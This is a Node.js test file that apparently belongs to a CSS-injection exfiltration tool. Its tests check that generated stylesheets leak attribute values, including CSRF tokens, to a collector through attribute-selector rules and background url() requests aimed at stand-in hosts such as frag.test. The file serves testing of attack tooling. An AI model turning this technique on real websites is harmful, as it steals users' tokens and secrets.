'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const P = require('../public/payload');
const B = require('../public/blind');
const { parsePayload, grams, leak } = require('./helpers');

test('compact property names are valid, unique and separate from anchors', () => {
  const names = new Set();
  for (let i = 0; i < 8 * 16 ** 4; i++) {
    const name = P.shortName(i);
    assert.match(name, /^[a-zA-Z0-9_]+$/);
    assert.ok(!names.has(name), name);
    names.add(name);
  }
  assert.equal(P.shortName(26), 'A');
  assert.equal(P.shortName(52), '0');
  assert.equal(P.shortName(62), '_');
  assert.equal(P.shortName(63), 'aa');
  assert.equal(P.shortName(16 ** 4 - 1).length, 3);
  const reconNames = new Set(B.reconPayload().rules.map(r => r.prop));
  const extract = B.extractPayload([{ id: 0, kind: 'a', name: 'code', host: 'self', windowSize: 4 }]);
  for (const r of extract.rules) assert.ok(!reconNames.has(r.prop), `recon collision: ${r.prop}`);
});

test('attribute serialization chooses compact identifiers without changing values', () => {
  for (const value of ['abcd', 'a01f', '_token', 'csrf-token', '-token', '--token']) assert.equal(P.attributeValue(value), value);
  for (const value of ['0123', '1abc', '-1', 'a & b', '', '\u00e9', '\ud83d\udd11']) {
    assert.equal(P.attributeValue(value), JSON.stringify(value));
  }
  for (const [value, escaped] of [['ab&', 'ab\\&'], ['a+b', 'a\\+b'], ['a/b', 'a\\/b'], ['-', '\\-'], ['"', '\\"']]) {
    assert.equal(P.attributeValue(value), escaped);
  }
  assert.equal(P.attributeValue('"\\\n\r\f'), '"\\"\\\\\\a \\d \\c "');
  for (const context of ['"\\', '\n\r', 'a&']) {
    const css = P.generateCSS({ selector: 'a', attribute: 'href', tag: 'a',
      startContext: context, endContext: context, windowSize: 3 }, 'http://frag.test');
    const { data } = leak(parsePayload(css), context + 'abcdef01' + context);
    assert.equal(data.start, 'ab');
    assert.equal(data.end, '01');
  }
});

test('collector shortening preserves the port and leaves other origins intact', () => {
  for (const host of ['127.0.0.1', '127.1']) {
    assert.equal(P.collectorURL(`http://${host}:3000`), 'http://127.1:3000');
  }
  assert.equal(P.collectorURL('http://127.0.0.1'), 'http://127.1');
  assert.equal(new URL(P.collectorURL('http://127.0.0.1:3000')).host, '127.0.0.1:3000');
  for (const url of ['http://localhost', 'http://localhost:3000', 'https://localhost:3000', 'https://127.0.0.1', 'http://[::1]:3000',
    'http://localhost.example:3000', 'http://127.0.0.10:3000', 'https://frag.test']) {
    assert.equal(P.collectorURL(url), url);
  }
  const cfg = { selector: 'a', attribute: 'href', tag: 'a', windowSize: 3,
    useStartsWith: true, useEndsWith: true };
  for (const css of [P.generateCSS(cfg, 'http://127.0.0.1:3000'),
    B.generateReconCSS({ targets: ['input'] }, 'http://127.0.0.1:3000'),
    B.generateBlindCSS([{ id: 0, kind: 'input', name: 'csrf', host: 'form', windowSize: 3 }], 'http://127.0.0.1:3000')]) {
    assert.ok(css.includes('url(http://127.1:3000/'));
    assert.ok(!css.includes('localhost'));
  }
});

test('sparse backgrounds include exactly the matched probes, or just none', () => {
  for (const windowSize of [3, 4]) {
    const css = P.generateCSS({ selector: 'a', attribute: 'href', tag: 'a', windowSize,
      useStartsWith: true, useEndsWith: true }, 'http://frag.test');
    const rules = parsePayload(css);
    for (const value of ['!', '0123456789abcdefabcd']) {
      const props = new Map();
      for (const r of rules) {
        if (r.op === '*=' ? value.includes(r.value) : r.op === '^=' ? value.startsWith(r.value) : value.endsWith(r.value)) {
          props.set(r.prop, `url(http://frag.test/${r.t === 'm' ? '' : r.t + '/'}${r.c}),`);
        }
      }
      const actual = new Set();
      for (const [, background] of css.matchAll(/background:([^;}]+)/g)) {
        const resolved = background.replace(/var\(--([\w-]+),\)/g, (_, name) => props.get(name) || '');
        assert.match(resolved, /^(?:url\([^)]*\),)*none$/);
        if (value === '!') assert.equal(resolved, 'none');
        for (const [, path] of resolved.matchAll(/url\(http:\/\/frag.test\/([^)]*)\)/g)) actual.add(path);
      }
      const expected = value === '!' ? [] : [...grams(value, windowSize), 's/01', 'e/cd'];
      assert.deepEqual(actual, new Set(expected));
    }
  }
});

test('charsets: alphabets, helpers and window sizes', () => {
  assert.deepEqual(Object.keys(P.CHARSETS), ['hex', 'alnum', 'base64', 'base64url']);
  assert.equal(P.CHARSETS.alnum.fold.length, 36);
  assert.equal(P.CHARSETS.base64.fold.length, 39);
  assert.equal(P.CHARSETS.base64url.fold.length, 38);
  assert.equal(P.charsetOf('nope'), P.CHARSETS.hex);
  assert.equal(P.charsetOf('__proto__'), P.CHARSETS.hex);
  assert.equal(P.charsetName(undefined), 'hex');
  assert.equal(P.windowSizeFor('hex', 3), 3);
  assert.equal(P.windowSizeFor('hex', 'x'), 4);
  assert.equal(P.windowSizeFor('alnum', 4), 3, 'non-hex charsets only offer 3-char windows');
  // Case pairs: every pair over the full alphabet with at least one letter.
  assert.equal(P.caseBigrams(P.CHARSETS.hex).length, 0);
  assert.equal(P.caseBigrams(P.CHARSETS.alnum).length, 62 ** 2 - 10 ** 2);
  assert.equal(P.caseBigrams(P.CHARSETS.base64).length, 65 ** 2 - 13 ** 2);
  assert.deepEqual([...P.foldWindows('Token=AB/', P.CHARSETS.base64, 3)],
    ['tok', 'oke', 'ken', 'en=', 'n=a', '=ab', 'ab/']);
  assert.deepEqual([...P.foldWindows('callback?x', P.CHARSETS.hex, 3)], ['bac']);
  assert.deepEqual([...P.caseBigramsIn('To+k3', P.CHARSETS.alnum)], ['To', 'k3']);
  assert.equal(P.pathChunk('a/b/'), 'a%2Fb%2F');
  assert.equal(P.attributeTest('href', '*=', 'abc', true), '[href*=abc i]');
  assert.equal(P.attributeTest('href', '*=', '0ab', true), '[href*="0ab"i]');
  assert.equal(P.attributeTest('href', '*=', 'aB', false), '[href*=aB]');
});

test('non-hex payloads: case-insensitive windows, case-sensitive pairs, encoded slashes', () => {
  const cfg = { selector: 'a', attribute: 'href', tag: 'a', windowSize: 3, charset: 'base64',
    useStartsWith: true, useEndsWith: true };
  const css = P.generateCSS(cfg, 'http://frag.test');
  const rules = parsePayload(css);
  assert.equal(rules.length, P.ruleCount(cfg));
  assert.equal(rules.length, 39 ** 3 + 2 * 39 ** 2 + 65 ** 2 - 13 ** 2);
  for (const r of rules) assert.equal(r.ci, r.t !== 'c', `${r.t}/${r.c}`);
  assert.ok(css.includes('&[href*=a\\/b i]{--'), 'slash windows are matched');
  assert.ok(css.includes('url(http://frag.test/a%2Fb),'), 'and sent as %2F');
  assert.ok(css.includes('&[href*=aB]{--'));
  assert.ok(css.includes('url(http://frag.test/c/aB),'));
  // Hex payloads are unchanged: no flags, no case pairs.
  const hex = P.generateCSS({ ...cfg, charset: 'hex' }, 'http://frag.test');
  assert.ok(!/ i\]|"i\]|\/c\//.test(hex));
  assert.equal(parsePayload(hex).length, 16 ** 3 + 2 * 16 ** 2);
});

test('non-hex sparse backgrounds include exactly the matched probes', () => {
  const cfg = { selector: 'a', attribute: 'href', tag: 'a', windowSize: 3, charset: 'alnum',
    useStartsWith: true, useEndsWith: true };
  const css = P.generateCSS(cfg, 'http://frag.test');
  const value = 'Ab3dE';
  const { requests } = leak(parsePayload(css), value);
  const got = new Set(requests.map(r => (r.t === 'm' ? '' : r.t + '/') + r.c));
  assert.deepEqual(got, new Set(['s/ab', 'ab3', 'b3d', '3de', 'c/Ab', 'c/b3', 'c/3d', 'c/dE', 'e/de']));
});
